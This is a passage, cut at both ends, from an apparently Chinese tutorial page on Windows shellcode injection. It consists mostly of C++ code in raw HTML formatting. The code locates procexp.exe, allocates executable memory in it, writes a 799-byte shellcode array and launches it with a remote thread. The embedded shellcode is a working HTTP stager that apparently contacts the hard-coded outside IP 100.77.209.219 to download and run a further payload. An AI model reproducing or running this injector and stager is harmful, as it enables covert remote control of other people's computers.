flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">LPTHREAD_START_ROUTINE</span><span style="color: rgb(51, 51, 51);">)</span><span style="color: rgb(51, 51, 51);">lpAddr</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//目标进程的回调函数</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        NULL</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//回调参数</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        NULL</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">);</span></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里我们不要立马释放因为可能执行需要一段时间，所以要等待执行完毕再释放 完成代码为</p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">// shellcode.cpp : 定义控制台应用程序的入口点。</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">//</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(24, 54, 145);">"stdafx.h"</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(24, 54, 145);">&lt;Windows.h&gt;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">#include</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(24, 54, 145);">&lt;TlHelp32.h&gt;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">/* length: 799 bytes */</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">unsigned</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(167, 29, 93);">char</span><span style="color: rgb(51, 51, 51);"> data</span><span style="color: rgb(51, 51, 51);">[]</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(24, 54, 145);">"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xae\x08\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x58\x66\x39\x65\x00\xc8\x03\xfe\x93\x1a\x5e\x52\x6d\x5a\x5d\x0d\x22\x3c\x47\x8e\x31\x2d\x7b\xee\xa8\xc3\x22\x6b\x24\xb5\x43\x4d\x44\x35\x96\x5c\x48\xd7\xed\x39\xcc\xee\xbf\xde\x49\x49\x3f\x83\x58\xe9\x48\x1e\x33\xc7\x49\x50\x48\xd4\x97\xc7\x14\xf4\x34\x36\x15\x89\x74\x00\x00\xb2\x0a\xd7\x63\x86\xdc\x5e\x9b\x74\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4c\x42\x42\x52\x4f\x57\x53\x45\x52\x29\x0d\x0a\x00\x0b\x81\xc7\x34\x3d\xa6\xb5\x8f\x9a\xeb\x20\x23\xc5\xb5\xe6\x9d\x11\x47\x8e\xc0\x15\xd9\x15\xc4\x57\x55\x1a\xd1\xc7\xcd\xfc\xa6\xef\xfe\xe0\x02\xfc\xaa\x9e\x73\xf7\x3c\xa0\xd8\xef\xae\x42\x73\x79\x7a\x50\xe2\x04\x6a\xb3\x1c\x8e\xd4\xfa\x11\x0f\x4d\xe7\x16\xfe\x22\x29\xa9\x81\x5b\x45\xf0\xc6\x90\x97\x49\xf6\x85\xa3\xf8\xc8\xf7\x7d\xcc\xab\x89\x33\x13\x1a\x76\x30\x03\x10\x7f\x3e\x67\xe6\x59\xf9\xbd\x84\x70\x6e\x2a\x3a\x1f\x88\x51\xa8\x26\x89\x0e\x1b\xba\xef\xaf\xe8\xc5\x59\xbf\x4d\xe5\x47\xad\xef\xc8\x32\x31\xe8\xb5\x9d\xf9\xd6\xea\xf5\x64\xd6\xf3\xf6\xb5\xa0\xc9\x94\xf0\xbc\xe5\x5e\x51\xee\x31\x14\xc7\x94\xf2\x79\x56\x10\xc5\x56\x04\x85\xa9\x0a\x36\x7c\x2d\x4a\x06\xe2\xcf\x29\x25\x68\xc7\x9b\x90\xf6\x8f\x6a\x9b\xda\xf7\x2f\x96\x58\x9c\x44\x15\xf5\xbf\xe8\x4d\x82\x31\xcd\x5f\x39\x6a\xdf\xd7\xc3\xb5\x9c\x21\x23\x85\xbf\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x30\x30\x2e\x37\x37\x2e\x32\x30\x39\x2e\x32\x31\x39\x00\x6f\xaa\x51\xc3"</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">typedef</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(167, 29, 93);">void</span><span style="color: rgb(51, 51, 51);">(*</span><span style="color: rgb(51, 51, 51);">PFN_FOO</span><span style="color: rgb(51, 51, 51);">)();</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">int</span><span style="color: rgb(51, 51, 51);"> main</span><span style="color: rgb(51, 51, 51);">()</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">{</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//获取快照</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    HANDLE hSnap </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">CreateToolhelp32Snapshot</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">TH32CS_SNAPPROCESS</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    PROCESSENTRY32 pe32</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    DWORD pid </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    pe32</span><span style="color: rgb(51, 51, 51);">.</span><span style="color: rgb(51, 51, 51);">dwSize </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(167, 29, 93);">sizeof</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">PROCESSENTRY32</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//查看第一个进程</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    BOOL bRet </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">Process32First</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">hSnap</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">&amp;</span><span style="color: rgb(51, 51, 51);">pe32</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(167, 29, 93);">while</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">bRet</span><span style="color: rgb(51, 51, 51);">)</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(51, 51, 51);">{</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        bRet </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">Process32Next</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">hSnap</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">&amp;</span><span style="color: rgb(51, 51, 51);">pe32</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(167, 29, 93);">if</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">wcscmp</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">pe32</span><span style="color: rgb(51, 51, 51);">.</span><span style="color: rgb(51, 51, 51);">szExeFile</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> L</span><span style="color: rgb(24, 54, 145);">"procexp.exe"</span><span style="color: rgb(51, 51, 51);">)</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">==</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">){</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            pid </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> pe32</span><span style="color: rgb(51, 51, 51);">.</span><span style="color: rgb(51, 51, 51);">th32ProcessID</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            </span><span style="color: rgb(167, 29, 93);">break</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">}</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(51, 51, 51);">}</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//获取进程句柄</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    HANDLE hProcess </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">OpenProcess</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">PROCESS_ALL_ACCESS</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> FALSE</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> pid</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//1.在目标进程开辟空间</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    LPVOID lpAddr </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">VirtualAllocEx</span><span style="color: rgb(51, 51, 51);">(</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        hProcess</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//在目标进程中开辟空间</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        NULL</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//表示任意地址，随机分配</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(0, 134, 179);">1</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//内存通常是以分页为单位来给空间 1页=4k 4096字节</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        MEM_COMMIT</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//告诉操作系统给分配一块内存</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        PAGE_EXECUTE_READWRITE</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(167, 29, 93);">if</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">lpAddr </span><span style="color: rgb(51, 51, 51);">==</span><span style="color: rgb(51, 51, 51);"> NULL</span><span style="color: rgb(51, 51, 51);">){</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        printf</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(24, 54, 145);">"Alloc error!"</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(167, 29, 93);">return</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(51, 51, 51);">}</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    DWORD dwWritesBytes </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//2.在目标进程中写入代码</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    bRet </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">WriteProcessMemory</span><span style="color: rgb(51, 51, 51);">(</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        hProcess</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//目标进程</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        lpAddr</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//目标地址    目标进程中</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        data</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//源数据    当前进程中</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(167, 29, 93);">sizeof</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">data</span><span style="color: rgb(51, 51, 51);">),</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//写多大</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span 